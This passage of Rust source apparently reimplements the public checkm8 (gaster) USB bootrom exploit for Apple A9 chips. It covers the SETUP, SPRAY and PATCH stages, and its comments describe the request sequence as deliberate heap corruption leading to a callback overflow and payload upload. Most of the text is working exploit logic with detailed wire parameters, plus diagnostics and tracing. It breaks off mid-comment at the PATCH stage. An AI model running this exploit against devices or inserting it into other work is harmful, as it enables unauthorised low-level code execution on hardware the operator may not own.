// ---------------------------------------------------------------------------

/// One `DFU_GET_STATUS`, recording the raw `bState`.
///
/// **Diagnostic only** (`RunOptions::probe_setup_state`, off by default): gaster
/// never reads the state between the cancel and the pad (`gaster.c:853`), so this
/// is added information, not a correction. See that option's doc for what each
/// answer means and for why a probe run is not comparable with a non-probe one.
///
/// `bState` is byte 4 of the 6-byte reply, as everywhere else in this crate
/// (`usb.rs`'s `dfu_status_state` uses the same offset and the same `>= 5`
/// guard). `None` is **unread**, never a state.
fn probe_dfu_state(io: &mut StageIo) -> Option<u8> {
    let mut buf = [0u8; 6];
    let timeout = io.opts.timeout_ms();
    let r = io.usb.control(
        CtrlReq {
            bm: 0xA1,
            b: DFU_GETSTATUS,
            value: 0,
            index: 0,
            length: 6,
        },
        &mut buf,
        timeout,
    );
    io.trace.xfer(Stage::Setup, "setup_probe_get_status", &r);
    if r.status == XferStatus::Ok && r.transferred >= 5 {
        Some(buf[4])
    } else {
        None
    }
}

/// gaster's `checkm8_stage_setup` (gaster.c:848-860) — and the whole point of this
/// rewrite: a SETUP sweep that says what it tried.
///
/// Target transfer sizes and the pass condition are gaster's, unchanged
/// (gaster.c:848-860):
///
/// 1. submit an async `DFU_DNLOAD` of `DFU_MAX_TRANSFER_SZ` (0x800) aborted after
///    the current window;
/// 2. if it delivered fewer than `overwrite_pad` bytes, send a **pad request** of
///    `overwrite_pad - transferred` bytes as a `bm=0, b=0` control OUT, and
///    **STALL is the pass condition**;
/// 3. otherwise (or if the pad did not STALL) send a `DFU_DNLOAD` of
///    `EP0_MAX_PACKET_SZ` and advance the window.
///
/// The one parameter that is ours and not gaster's is the pad request's timeout
/// ([`RunOptions::pad_timeout_ms`]): gaster asks the pad question with
/// `usb_timeout`, which on this host cut the answer off before the device gave
/// it. Everything else here — order, lengths, windows, the `bm=0,b=0` pad — is the
/// reference's.
pub fn stage_setup(io: &mut StageIo) -> StageResult {
    let usb_timeout = io.opts.timeout_ms();
    let abort_min = io.opts.abort_timeout_min_ms.min(usb_timeout);
    let span = window_span(usb_timeout, abort_min);
    let pad_target = io.cfg.overwrite_pad;
    let pad_timeout = pad_timeout(io.opts);
    let mut window = initial_abort_window(usb_timeout, abort_min);

    let mut stats = SetupStats::new(pad_target, usb_timeout, abort_min, pad_timeout);
    let started = Instant::now();

    io.trace.event(
        "setup_begin",
        Some(Stage::Setup),
        &format!(
            "overwrite_pad=0x{pad_target:X} usb_timeout={usb_timeout}ms pad_timeout={pad_timeout}ms \
             abort_min={abort_min}ms first_window={window}ms span={span} budget_attempts={} \
             budget_ms={} (gaster.c:849 starts at usb_timeout-1; pad_timeout is gaster's 5 ms by \
             default and is ours to move — a pad STALL at 20-40 ms is the device's EP0 watchdog, \
             not corruption; see RunOptions::pad_timeout_ms)",
            io.opts.setup_budget.max_attempts, io.opts.setup_budget.max_millis
        ),
    );

    loop {
        stats.attempts += 1;
        let elapsed_ms = started.elapsed().as_millis() as u64;
        if stats.attempts > io.opts.setup_budget.max_attempts
            || (io.opts.setup_budget.max_millis > 0 && elapsed_ms >= io.opts.setup_budget.max_millis)
        {
            let detail = format!(
                "SETUP exhausts its budget without a pad STALL after {} attempts / {} ms \
                 (budget {} attempts / {} ms). {}",
                stats.attempts - 1,
                elapsed_ms,
                io.opts.setup_budget.max_attempts,
                io.opts.setup_budget.max_millis,
                stats.summary()
            );
            let summary = stats.summary();
            io.trace.event("setup_summary", Some(Stage::Setup), &summary);
            println!("  SETUP: {}", one_line(&summary));
            io.trace.predicate(
                Stage::Setup,
                "setup_pad_stall",
                false,
                &format!("budget exhausted without a pad STALL: {}", one_line(&summary)),
            );
            return fail(
                "SETUP_BUDGET_EXHAUSTED",
                detail,
                stats.last_pad.clone().or_else(|| stats.last_abort.clone()),
            );
        }

        stats.note_window(window);

        // 1. the aborted transfer.
        let abort = req_async(
            io,
            0x21,
            DFU_DNLOAD,
            0,
            0,
            DFU_MAX_TRANSFER_SZ,
            window,
        );
        io.trace.xfer(Stage::Setup, "setup_abort_dnload", &abort);

        // A transport that is refusing transfers (device gone, handle poisoned)
        // never reaped anything: the sweep cannot converge and would just burn
        // its whole budget on 0-us errors. Report it as the transport failure it
        // is; the run loop's reset + re-open then decides whether to continue.
        if abort_was_refused(&abort) {
            let summary = stats.summary();
            io.trace.event("setup_summary", Some(Stage::Setup), &summary);
            return fail(
                "TRANSPORT_DEVICE_LOST",
                format!(
                    "the transport refused the aborted DNLOAD on attempt {} without submitting it \
                     (status Error, 0 us, no abort window): the device handle is gone. {}",
                    stats.attempts, summary
                ),
                Some(abort),
            );
        }

        let completed = abort_completed(&abort);

        // DIAGNOSTIC, not gaster (see `RunOptions::probe_setup_state`): ask the
        // *device* whether the DNLOAD registered at all, since USBPcap can only
        // show what the host offered. Recorded, never acted on: the pass
        // condition, the pad, the drain and the window are untouched, and this
        // branch does not exist unless the operator asked for it.
        if io.opts.probe_setup_state && completed {
            let state = probe_dfu_state(io);
            stats.record_probe(state);
            let detail = format!(
                "attempt={} probe_state={} (after the aborted DNLOAD returned {} with {} bytes); \
                 tally=[{}]; DIAGNOSTIC DEVIATION — gaster.c:853 never reads this, and the probe \
                 itself perturbs the sequence, so this run is not comparable with a non-probe one",
                stats.attempts,
                match state {
                    Some(s) => format!("{s} ({})", dfu_state_label(s)),
                    None => "unread".to_string(),
                },
                abort.status,
                abort.transferred,
                stats.probe_tally_line()
            );
            io.trace
                .event("setup_probe_state", Some(Stage::Setup), &detail);
            if should_print_attempt(io.opts, stats.attempts) {
                println!("  SETUP: {}", one_line(&detail));
            }
        }

        // 2. the pad request, exactly when gaster sends one.
        let mut pad_len: Option<u32> = None;
        let mut pad: Option<XferResult> = None;
        if completed {
            if let Some(len) = pad_request_len(pad_target, abort.transferred) {
                if len > u16::MAX as u32 {
                    return fail(
                        "SETUP_PAD_LENGTH_INVALID",
                        format!(
                            "pad request length {len} exceeds the u16 wLength of a control \
                             transfer (overwrite_pad 0x{pad_target:X}, aborted transfer \
                             delivered {})",
                            abort.transferred
                        ),
                        Some(abort),
                    );
                }
                pad_len = Some(len);
                // gaster.c:853 — bm=0, b=0, wValue=0, wIndex=0: a request the
                // bootrom's DFU stack has no handler for, which is *why* a STALL
                // here is the success signal.
                //
                // **This one request carries its own timeout** (`pad_timeout_ms`,
                // default = gaster's 5 ms). It IS the pass condition, so it is the
                // one request whose deadline is worth being able to move
                // independently — but the deadline must not be raised *silently*:
                // this ROM watchdog-STALLs a stuck EP0 request at 21-37 ms, so a
                // 40 ms timeout turns that watchdog into a false pass with no
                // corruption behind it. A STALL at 20-40 ms is a red flag, not a
                // win. The aborted DNLOAD, the drain DNLOAD and the GET_STATUS
                // reads stay on `usb_timeout_ms`; moving them would let the
                // 2048-byte DNLOAD complete and destroy the sweep. The wire
                // parameters are unchanged. (`pad_timeout` is the local computed
                // once at the top of the sweep.)
                let p = req_ctrl_with_timeout(
                    io,
                    CtrlReq {
                        bm: 0,
                        b: 0,
                        value: 0,
                        index: 0,
                        length: len as u16,
                    },
                    pad_timeout,
                );
                io.trace.xfer(Stage::Setup, "setup_pad_request", &p);
                stats.record_pad(&p);
                pad = Some(p);
            }
        }

        let line = stats.attempt_line(&abort, window, pad_len, pad.as_ref());
        io.trace.event("setup_attempt", Some(Stage::Setup), &line);
        if should_print_attempt(io.opts, stats.attempts) {
            println!("  SETUP: {line}");
        }

        // A sweep that cannot vary, or that is not varying, is one experiment
        // wearing N labels — the defect that made the previous tool's log
        // misleading. Say it once, loudly, then keep working.
        if let Some(msg) = stats.frozen_sweep_notice() {
            io.trace
                .event("setup_degenerate_sweep", Some(Stage::Setup), &msg);
            io.trace
                .predicate(Stage::Setup, "abort_window_can_vary", false, &msg);
            println!("  SETUP: WARNING - {msg}");
        }

        // The pass condition, in full: fewer than `overwrite_pad` bytes and a
        // pad request that STALLed (gaster.c:853). `pad_stalls` was already
        // counted by `record_pad` when the pad was sent — it used to be
        // incremented a second time here, so the summary reported 2 STALLs for
        // one pad request. The trace counter (`setup_stall_seen`) was unaffected.
        if setup_passed(abort.transferred, pad_target, pad.as_ref()) {
            let summary = stats.summary();
            io.trace.event("setup_summary", Some(Stage::Setup), &summary);
            io.trace.event(
                "setup_stall",
                Some(Stage::Setup),
                &format!(
                    "pad request of {pad_len:?} bytes STALLed after {} attempts — the pass \
                     condition (gaster.c:853)",
                    stats.attempts
                ),
            );
            println!("  SETUP: PASSED - pad STALL after {} attempts. {}", stats.attempts, one_line(&summary));
            io.trace.predicate(
                Stage::Setup,
                "setup_pad_stall",
                true,
                &format!(
                    "pad request of {pad_len:?} bytes STALLed on attempt {} (gaster.c:853)",
                    stats.attempts
                ),
            );
            return StageResult::Pass;
        }

        // 3. gaster.c:856-857 — the drain DNLOAD, then advance the window.
        let drain = req_no_data(io, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ);
        io.trace.xfer(Stage::Setup, "setup_drain_dnload", &drain);
        if drain.status == XferStatus::NoDevice {
            let summary = stats.summary();
            io.trace.event("setup_summary", Some(Stage::Setup), &summary);
            return fail(
                "TRANSPORT_DEVICE_LOST",
                format!("the device disappeared during the SETUP sweep. {}", stats.summary()),
                Some(drain),
            );
        }
        window = advance_abort_window(window, usb_timeout, abort_min);
    }
}

/// Print every attempt when `--verbose`, otherwise the head of the sweep and
/// then a sparse tail. The reference prints nothing here at all, and 35 KB of
/// one repeated line is what that cost us; 20 000 lines of progress is the same
/// mistake with the sign flipped. Nothing is hidden: every attempt is written to
/// the trace file regardless, and the sweep summary is always printed.
const SETUP_STDOUT_HEAD: u64 = 20;
const SETUP_STDOUT_EVERY: u64 = 100;

fn should_print_attempt(opts: &RunOptions, attempt: u64) -> bool {
    opts.verbose || attempt <= SETUP_STDOUT_HEAD || attempt % SETUP_STDOUT_EVERY == 0
}

#[derive(Debug, Clone)]
struct SetupStats {
    attempts: u64,
    pad_target: u32,
    usb_timeout: u32,
    abort_min: u32,
    /// The pad request's deadline, as requested. Reported next to the measured
    /// `pad_micros` so requested-vs-effective is auditable in one line: `5` and
    /// `5337us` reads as "5 ms honoured, +337 us for the cancel". It is a sweep
    /// parameter, not a transfer fact, which is why the transport does not carry it.
    pad_deadline_ms: u32,
    windows: Vec<u32>,
    pad_sent: u64,
    pad_stalls: u64,
    pad_ok: u64,
    pad_timeouts: u64,
    pad_other: u64,
    short_aborts: u64,
    /// Host reported 0 bytes for the aborted transfer. Logged explicitly because
    /// a 0 here is "we learned nothing", not "the device took nothing".
    zero_aborts: u64,
    incomplete_aborts: u64,
    last_abort: Option<XferResult>,
    last_pad: Option<XferResult>,
    last_micros: u64,
    /// Graph-theoretic facts about whether this sweep can vary at all.
    span: u32,
    degenerate: bool,
    frozen_reported: bool,
    /// `--probe-setup-state` only: the `bState` distribution seen between the
    /// aborted DNLOAD and the pad, and how many probes went unread. Empty unless
    /// the probe ran, so the default path's record is unchanged.
    probe_states: BTreeMap<u8, u64>,
    probe_unread: u64,
}

impl SetupStats {
    fn new(pad_target: u32, usb_timeout: u32, abort_min: u32, pad_deadline_ms: u32) -> SetupStats {
        let span = window_span(usb_timeout, abort_min);
        SetupStats {
            attempts: 0,
            pad_target,
            usb_timeout,
            abort_min,
            pad_deadline_ms,
            windows: Vec::new(),
            pad_sent: 0,
            pad_stalls: 0,
            pad_ok: 0,
            pad_timeouts: 0,
            pad_other: 0,
            short_aborts: 0,
            zero_aborts: 0,
            incomplete_aborts: 0,
            last_abort: None,
            last_pad: None,
            last_micros: 0,
            span,
            // abort_min == usb_timeout makes gaster.c:857's modulus 1: the window
            // is pinned and the "sweep" is one experiment with N labels. gaster
            // only rejects abort_min *strictly greater* than usb_timeout
            // (gaster.c:1635-1638), so it has the same trap.
            degenerate: span == 1,
            frozen_reported: false,
            probe_states: BTreeMap::new(),
            probe_unread: 0,
        }
    }

    /// `--probe-setup-state` only. `None` is *unread*, and is tallied separately
    /// so an unreadable state can never be folded into a real one.
    fn record_probe(&mut self, state: Option<u8>) {
        match state {
            Some(s) => *self.probe_states.entry(s).or_insert(0) += 1,
            None => self.probe_unread += 1,
        }
    }

    /// The running state distribution, so the *last* probe line of a sweep carries
    /// the whole result: `5 (dfuDNLOAD-IDLE)=12, 4 (dfuDNBUSY)=1, unread=3`.
    fn probe_tally_line(&self) -> String {
        let mut parts: Vec<String> = self
            .probe_states
            .iter()
            .map(|(s, n)| format!("{} ({})={}", s, dfu_state_label(*s), n))
            .collect();
        if self.probe_unread > 0 {
            parts.push(format!("unread={}", self.probe_unread));
        }
        if parts.is_empty() {
            "-".to_string()
        } else {
            parts.join(", ")
        }
    }

    /// `Some(message)` exactly once when the sweep cannot vary (span == 1) or is
    /// observed not to vary over more attempts than the cycle has windows.
    fn frozen_sweep_notice(&mut self) -> Option<String> {
        if self.frozen_reported {
            return None;
        }
        let structural = self.degenerate;
        let observed = self.attempts > self.span as u64 + 1 && self.windows.len() == 1;
        if !(structural || observed) {
            return None;
        }
        self.frozen_reported = true;
        Some(format!(
            "the abort window is NOT sweeping: {} attempt(s), {} distinct window(s) [{}]. \
             usb_timeout={}ms abort_min={}ms gives gaster.c:857's cycle a span of {}{}, so the \
             window cannot vary and the sweep is one experiment wearing N labels — the defect \
             that made the previous tool's log misleading. Lower --abort-min-ms or raise \
             --usb-timeout-ms (gaster only rejects abort_min > usb_timeout, gaster.c:1635-1638, \
             so it inherits this too).",
            self.attempts,
            self.windows.len(),
            self.windows
                .iter()
                .map(|w| format!("{w}ms"))
                .collect::<Vec<_>>()
                .join(","),
            self.usb_timeout,
            self.abort_min,
            self.span,
            if structural {
                " (abort_min == usb_timeout)"
            } else {
                ""
            },
        ))
    }

    fn note_window(&mut self, w: u32) {
        if !self.windows.contains(&w) {
            self.windows.push(w);
        }
    }

    fn record_pad(&mut self, p: &XferResult) {
        self.pad_sent += 1;
        match p.status {
            XferStatus::Stall => self.pad_stalls += 1,
            XferStatus::Ok => self.pad_ok += 1,
            XferStatus::Timeout => self.pad_timeouts += 1,
            _ => self.pad_other += 1,
        }
        self.last_pad = Some(p.clone());
    }

    fn attempt_line(
        &mut self,
        abort: &XferResult,
        window: u32,
        pad_len: Option<u32>,
        pad: Option<&XferResult>,
    ) -> String {
        self.last_abort = Some(abort.clone());
        self.last_micros = abort.micros;
        if abort.transferred == 0 {
            self.zero_aborts += 1;
        }
        if pad_request_len(self.pad_target, abort.transferred).is_some() {
            self.short_aborts += 1;
        }
        if !abort_completed(abort) {
            self.incomplete_aborts += 1;
        }

        let delivered = if abort.transferred == 0 {
            "0 (host reported nothing)".to_string()
        } else {
            abort.transferred.to_string()
        };
        let pad_part = match (pad_len, pad) {
            (Some(len), Some(p)) => format!(
                "pad_req={len} after_abort_status={} after_abort_xfer={}/{} \
                 after_abort_rc={} pad_status={} pad_xfer={}/{} pad_deadline_ms={} pad_micros={} \
                 (requested vs effective; usb_timeout={}ms defines the abort sweep, not this)",
                abort.status,
                abort.transferred,
                abort.requested,
                abort.libusb_rc,
                p.status,
                p.transferred,
                p.requested,
                self.pad_deadline_ms,
                p.micros,
                self.usb_timeout
            ),
            (Some(len), None) => format!(
                "pad_req={len} after_abort_status={} after_abort_rc={} pad_status=NOT_SENT \
                 (pad_deadline_ms={})",
                abort.status, abort.libusb_rc, self.pad_deadline_ms
            ),
            _ => format!(
                "pad_req=none (delivered >= overwrite_pad 0x{:X}) after_abort_status={} \
                 after_abort_rc={}",
                self.pad_target, abort.status, abort.libusb_rc
            ),
        };
        // A non-zero window that returns immediately did not wait, whatever the
        // transport called it. Flagged inline rather than left for the reader to
        // notice from the micros column.
        let short_return = if window >= 1 && abort.micros < 100 {
            format!(
                " returned_in_{}us_which_is_far_short_of_the_{}ms_window",
                abort.micros, window
            )
        } else {
            String::new()
        };
        let sweep = if self.degenerate {
            "sweep=DEGENERATE(span=1)"
        } else {
            "sweep=ok"
        };
        format!(
            "attempt={} abort_window_ms={} {sweep} abort_status={} abort_xfer={}/{} \
             abort_micros={} note=\"{}{}\" {}",
            self.attempts,
            window,
            abort.status,
            delivered,
            abort.requested,
            abort.micros,
            abort_note(abort),
            short_return,
            pad_part
        )
    }

    fn summary(&self) -> String {
        let windows = self
            .windows
            .iter()
            .map(|w| format!("{w}ms"))
            .collect::<Vec<_>>()
            .join(",");
        format!(
            "attempts={} distinct_abort_windows={} [{}] span={}{} pad_sent={} pad_stall={} \
             pad_ok={} pad_timeout={} pad_other={} short_aborts={} zero_aborts={} \
             incomplete_aborts={} last_window_micros={} (usb_timeout={}ms abort_min={}ms \
             pad_deadline_ms={}ms overwrite_pad=0x{:X})",
            self.attempts,
            self.windows.len(),
            windows,
            self.span,
            if self.degenerate {
                " DEGENERATE(span=1, window cannot vary)"
            } else {
                ""
            },
            self.pad_sent,
            self.pad_stalls,
            self.pad_ok,
            self.pad_timeouts,
            self.pad_other,
            self.short_aborts,
            self.zero_aborts,
            self.incomplete_aborts,
            self.last_micros,
            self.usb_timeout,
            self.abort_min,
            self.pad_deadline_ms,
            self.pad_target,
        )
    }
}

fn abort_note(r: &XferResult) -> &'static str {
    match r.status {
        XferStatus::Cancelled => "cancelled at the requested window",
        XferStatus::Timeout => "libusb timeout at usb_timeout; device was NAKing",
        XferStatus::Stall => "device STALLed the aborted transfer",
        XferStatus::Ok => "transfer completed inside the window",
        XferStatus::NoDevice => "device gone",
        XferStatus::Error => "host-side error; transfer was never reaped",
    }
}

fn one_line(s: &str) -> String {
    s.split_whitespace().collect::<Vec<_>>().join(" ")
}

// ---------------------------------------------------------------------------
// SPRAY
// ---------------------------------------------------------------------------

/// gaster's `checkm8_usb_request_stall` (gaster.c:889-894) as a pure request:
/// `bm=2, b=3, wValue=0, wIndex=0x80`, and a STALL is the answer we want.
///
/// Pure so the wire parameters are pinned by a test rather than by inspection
/// (`docs/VERIFICATION-live-run.md` B4). The `0x80` here is the same value
/// PATCH's overflow uses (`gaster.c:1211`) — they are separate constants in the
/// reference and are kept as separate constructors here.
pub fn spray_stall_req() -> CtrlReq {
    CtrlReq {
        bm: 2,
        b: 3,
        value: 0,
        index: 0x80,
        length: 0,
    }
}

/// gaster's `checkm8_usb_request_leak` request (gaster.c:866): an IN
/// `GET_DESCRIPTOR(3)` of `EP0_MAX_PACKET_SZ` bytes, aborted after 1 ms.
pub fn spray_leak_req(wvalue: u16, windex: u16) -> CtrlReq {
    CtrlReq {
        bm: 0x80,
        b: 6,
        value: wvalue,
        index: windex,
        length: EP0_MAX_PACKET_SZ,
    }
}

/// gaster's `checkm8_no_leak` request (gaster.c:886): the same request with
/// `3 * EP0_MAX_PACKET_SZ + 1` bytes requested.
pub fn spray_no_leak_req(wvalue: u16, windex: u16) -> CtrlReq {
    CtrlReq {
        bm: 0x80,
        b: 6,
        value: wvalue,
        index: windex,
        length: 3 * EP0_MAX_PACKET_SZ + 1,
    }
}

/// gaster.c:910 — the trailing `DFU_CLRSTATUS` whose length is the spray's own
/// magic number, `3 * EP0_MAX_PACKET_SZ + 1`.
pub fn spray_clr_status_req() -> CtrlReq {
    CtrlReq {
        bm: 0x21,
        b: DFU_CLRSTATUS,
        value: 0,
        index: 0,
        length: 3 * EP0_MAX_PACKET_SZ + 1,
    }
}

/// `wValue` for the leak requests: `(3 << 8) | iSerialNumber` (gaster.c:866).
///
/// The index comes from [`Transport::ident_index`] — the string-descriptor index
/// the transport already read **at open** — because gaster uses the cached
/// `device_descriptor.i_serial_number` and never re-reads it here.
///
/// It must **not** come from [`Transport::identity`]: that is a live
/// `GET_DESCRIPTOR`, and its own documentation says *"Do not call it between
/// SETUP and PATCH"* (`usb.rs:472`). Calling it in the leak helpers put two
/// extra EP0 transfers of up to 255 bytes into every spray iteration — five
/// requests per iteration where the reference sends three — inside the loop
/// whose request sequence *is* the heap corruption
/// (`docs/VERIFICATION-live-run.md` B2).
///
/// Pure, so the mapping is pinned by a test without a device.
pub fn leak_wvalue(ident_index: u8) -> u16 {
    (3u16 << 8) | ident_index as u16
}

/// gaster's `checkm8_usb_request_stall` (gaster.c:889-894).
fn usb_request_stall(io: &mut StageIo) -> XferResult {
    let r = req_ctrl(io, spray_stall_req());
    io.trace.xfer(Stage::Spray, "spray_request_stall", &r);
    r
}

/// gaster's `checkm8_usb_request_leak` (gaster.c:862-867).
fn usb_request_leak(io: &mut StageIo) -> XferResult {
    // The index is the one cached at open. Never `Transport::identity()` here:
    // that is a live GET_DESCRIPTOR, and its own doc forbids it between SETUP and
    // PATCH (usb.rs:472). See [`leak_wvalue`].
    let wvalue = leak_wvalue(io.usb.ident_index());
    let r = req_async_ctrl(io, spray_leak_req(wvalue, io.opts.leak_windex), 1);
    io.trace.xfer(Stage::Spray, "spray_request_leak", &r);
    r
}

/// gaster's `checkm8_no_leak` (gaster.c:882-887).
fn no_leak(io: &mut StageIo) -> XferResult {
    // Cached index again — usb.rs:472 forbids a live identity read here.
    let wvalue = leak_wvalue(io.usb.ident_index());
    let r = req_async_ctrl(io, spray_no_leak_req(wvalue, io.opts.leak_windex), 1);
    io.trace.xfer(Stage::Spray, "spray_no_leak", &r);
    r
}

/// A SPRAY transfer the transport could not carry: libusb still owns the buffer,
/// so the handle is poisoned and every later transfer comes back refused.
///
/// gaster simply retries forever — its wrapper returns false when a transfer was
/// never reaped (`gaster.c:282`) — but a *bounded* sweep that retried here would
/// spend its whole budget on transfers that never reached the wire, and the
/// alternative is worse: a refused transfer has `transferred == 0`, so scoring
/// it as a leak would report `Pass` on a dead handle
/// (`docs/VERIFICATION-live-run.md` B3). Named, not spun.
fn spray_transport_lost(
    io: &mut StageIo,
    iterations: u64,
    what: &str,
    r: &XferResult,
) -> StageResult {
    let detail = format!(
        "the transport is poisoned: libusb still owned a buffer it could not reap, so no further \
         transfer on this handle is a measurement. First noticed on SPRAY iteration {iterations} \
         at {what} (status {}, transferred {}, micros {}, libusb_rc {}). gaster retries forever \
         here (gaster.c:282 returns false for a transfer that was not completed); a bounded sweep \
         reports it instead of spending its budget on transfers that never reach the wire.",
        r.status, r.transferred, r.micros, r.libusb_rc
    );
    io.trace
        .event("spray_transport_lost", Some(Stage::Spray), &detail);
    println!("  SPRAY: FAILED - {}", one_line(&detail));
    fail("TRANSPORT_DEVICE_LOST", detail, Some(r.clone()))
}

/// gaster's `checkm8_stage_spray` (gaster.c:896-918), **A9 branch**.
///
/// The A9 path is selected by `config_large_leak == 0` and `cpid == 0x8003 ||
/// 0x8000` (gaster.c:900-901) and is a single flat loop of
/// `stall && leak && no-leak` with the reference's short-circuit order: if the
/// stall request does not STALL, the leak requests are not issued that iteration.
/// Anything else is refused rather than approximated — a different heap layout
/// driven with the A9 sequence is a silent corruption of the wrong object.
pub fn stage_spray(io: &mut StageIo) -> StageResult {
    if io.cfg.large_leak != 0 {
        return fail(
            "SPRAY_UNSUPPORTED_LARGE_LEAK",
            format!(
                "config {} has large_leak={} (non-zero). gaster's large-leak branch \
                 (gaster.c:911-915) is a different heap layout and is not driven here.",
                io.cfg.name, io.cfg.large_leak
            ),
            None,
        );
    }
    if io.cfg.cpid != 0x8003 && io.cfg.cpid != 0x8000 {
        return fail(
            "SPRAY_UNSUPPORTED_CHIP",
            format!(
                "config {} is CPID 0x{:04X}; only the A9 spray branch (gaster.c:902) is \
                 implemented. gaster.c:904-908 is a different sequence.",
                io.cfg.name, io.cfg.cpid
            ),
            None,
        );
    }

    let mut iterations: u64 = 0;
    let mut stalls = 0u64;
    let mut leaks = 0u64;
    let mut no_leaks = 0u64;
    let mut last: Option<XferResult> = None;
    let started = Instant::now();

    // The leak's `wValue` is part of the sequence, so it is stated once, up
    // front, from a value cached at open — not re-read from the device inside
    // the loop (see [`leak_wvalue`]).
    let leak_wvalue_used = leak_wvalue(io.usb.ident_index());
    let begin = format!(
        "leak_wValue=0x{leak_wvalue_used:04X} = (3<<8)|ident_index 0x{:02X}; leak/no-leak wIndex=0x{:X}; \
         lengths leak=0x{EP0_MAX_PACKET_SZ:X} no_leak=0x{:X} clr_status=0x{:X}; ident_index is the \
         string-descriptor index cached at open (gaster.c:866 uses device_descriptor.i_serial_number; \
         no GET_DESCRIPTOR is issued inside the loop — usb.rs:472)",
        io.usb.ident_index(),
        io.opts.leak_windex,
        3 * EP0_MAX_PACKET_SZ + 1,
        3 * EP0_MAX_PACKET_SZ + 1
    );
    io.trace.event("spray_begin", Some(Stage::Spray), &begin);
    println!("  SPRAY: {}", one_line(&begin));

    loop {
        iterations += 1;
        // The reference is genuinely unbounded here (gaster.c:902) and that is
        // not tidied away — it is bounded by the run-level budget, which is the
        // only bounded-spin budget `RunOptions` freezes (INTERFACE.md §4), and
        // every iteration is logged.
        let elapsed_ms = started.elapsed().as_millis() as u64;
        if iterations > io.opts.setup_budget.max_attempts
            || (io.opts.setup_budget.max_millis > 0
                && elapsed_ms >= io.opts.setup_budget.max_millis)
        {
            let detail = format!(
                "SPRAY did not satisfy stall && leak && no-leak in {} iterations / {} ms \
                 (run-level budget {} attempts / {} ms; gaster loops forever here, \
                 gaster.c:902). stalls={stalls} leaks={leaks} no_leaks={no_leaks} \
                 leak_windex=0x{:X}",
                iterations - 1,
                elapsed_ms,
                io.opts.setup_budget.max_attempts,
                io.opts.setup_budget.max_millis,
                io.opts.leak_windex
            );
            io.trace.event("spray_summary", Some(Stage::Spray), &detail);
            println!("  SPRAY: {}", one_line(&detail));
            return fail("SPRAY_BUDGET_EXHAUSTED", detail, last);
        }

        let s = usb_request_stall(io);
        io.trace.predicate(
            Stage::Spray,
            "checkm8_usb_request_stall",
            s.status == XferStatus::Stall,
            &format!("iteration={iterations} status={}", s.status),
        );
        // A handle the transport has poisoned is not a device: stop naming it as
        // an exploit failure and stop sweeping 20 000 transfers that never reach
        // the wire.
        if io.usb.is_poisoned() {
            return spray_transport_lost(io, iterations, "checkm8_usb_request_stall", &s);
        }
        let mut line = format!(
            "iteration={iterations} stall_status={} stall_micros={}",
            s.status, s.micros
        );
        let mut progressed = s.status == XferStatus::Stall;
        if progressed {
            stalls += 1;
            let l = usb_request_leak(io);
            line.push_str(&format!(
                " leak_status={} leak_xfer={} leak_micros={}",
                l.status, l.transferred, l.micros
            ));
            if io.usb.is_poisoned() {
                return spray_transport_lost(io, iterations, "checkm8_usb_request_leak", &l);
            }
            progressed = leak_satisfied(&l);
            last = Some(l);
            if progressed {
                leaks += 1;
                let n = no_leak(io);
                line.push_str(&format!(
                    " no_leak_status={} no_leak_xfer={} no_leak_micros={}",
                    n.status, n.transferred, n.micros
                ));
                if io.usb.is_poisoned() {
                    return spray_transport_lost(io, iterations, "checkm8_no_leak", &n);
                }
                progressed = leak_satisfied(&n);
                if progressed {
                    no_leaks += 1;
                }
            } else {
                // gaster's `||` short-circuits: no-leak is not issued this pass.
                line.push_str(" no_leak=not_issued(short_circuit)");
            }
        } else {
            line.push_str(" leak=not_issued(short_circuit) no_leak=not_issued(short_circuit)");
            last = Some(s);
        }

        io.trace.event("spray_iteration", Some(Stage::Spray), &line);
        if should_print_attempt(io.opts, iterations) {
            println!("  SPRAY: {line}");
        }

        if progressed {
            break;
        }
    }

    // gaster.c:910 — the final clear-status, whose length is the spray's own
    // magic number (3 * EP0_MAX_PACKET_SZ + 1).
    let clr = req_ctrl(io, spray_clr_status_req());
    io.trace.xfer(Stage::Spray, "spray_clr_status", &clr);
    io.trace.event(
        "spray_summary",
        Some(Stage::Spray),
        &format!(
            "iterations={iterations} stalls={stalls} leaks={leaks} no_leaks={no_leaks} \
             final_clr_status={}",
            clr.status
        ),
    );
    StageResult::Pass
}

// ---------------------------------------------------------------------------
// PATCH
// ---------------------------------------------------------------------------

/// gaster.c:1211 — the callback overflow request as a pure request:
/// `bm=2, b=3, wValue=0, wIndex=0x80`, carrying one `dfu_callback_t`.
///
/// `wIndex = 0x80` is load-bearing (HANDOFF §8.5: `a9ctl` hardcoded `0` and it
/// was a real bug) and was previously pinned by nothing in the suite
/// (`docs/VERIFICATION-live-run.md` Q4/B4). Pure, so a test can pin it.
pub fn patch_overflow_req(len: u16) -> CtrlReq {
    CtrlReq {
        bm: 2,
        b: 3,
        value: 0,
        index: 0x80,
        length: len,
    }
}

/// Is this upload chunk fully acknowledged? Used only to **record**, never to
/// stop: see [`stage_patch`] for why a short chunk is loud but not fatal. Pure,
/// so the difference between "delivered nothing" and "delivered everything" is
/// pinned by a test.
pub fn patch_chunk_complete(r: &XferResult, len: usize) -> bool {
    r.status == XferStatus::Ok && r.transferred == len
}

/// The `patch_uploaded` line. Pure, so it is pinned by a test — in particular
/// that a short chunk is *visible* in it rather than rounded away into a clean
/// `uploaded=N` reading.
pub fn patch_upload_summary(
    attempted: usize,
    acked: usize,
    short_chunks: u64,
    blob_sha256: &str,
    state_ok: bool,
) -> String {
    let mut s = format!(
        "chunk_loop: attempted={attempted} bytes, acknowledged={acked} bytes, \
         short_or_failed_chunks={short_chunks}; sha256={blob_sha256}; \
         manifest_walk_completed={state_ok} (gaster.c:1213-1222 checks neither: the chunk loop \
         cannot fail and the walk's result is discarded)"
    );
    if short_chunks > 0 {
        s.push_str(
            "; PATCH_UPLOAD_SHORT was recorded and the stage continued, exactly as the reference \
             does — the payload in the bootrom may be incomplete, and the PWND marker after the \
             next reset is the only proof either way",
        );
    }
    s
}

/// gaster's `checkm8_stage_patch` (gaster.c:1009-1229), A9 branch.
///
/// Order matters and is fixed: the 48-byte callback overflow first (gaster.c:1211)
/// — a **STALL is the success condition**, because the request is rejected
/// *because* it overran — then the payload in `DFU_MAX_TRANSFER_SZ` chunks
/// (gaster.c:1213-1216), then the file suffix and the MANIFEST state walk
/// (gaster.c:1218-1222). The bus reset that actually fires the overwritten
/// `dfu_handle_bus_reset` happens in `run`, after this returns.
///
/// One deliberate, documented deviation, observability only:
///
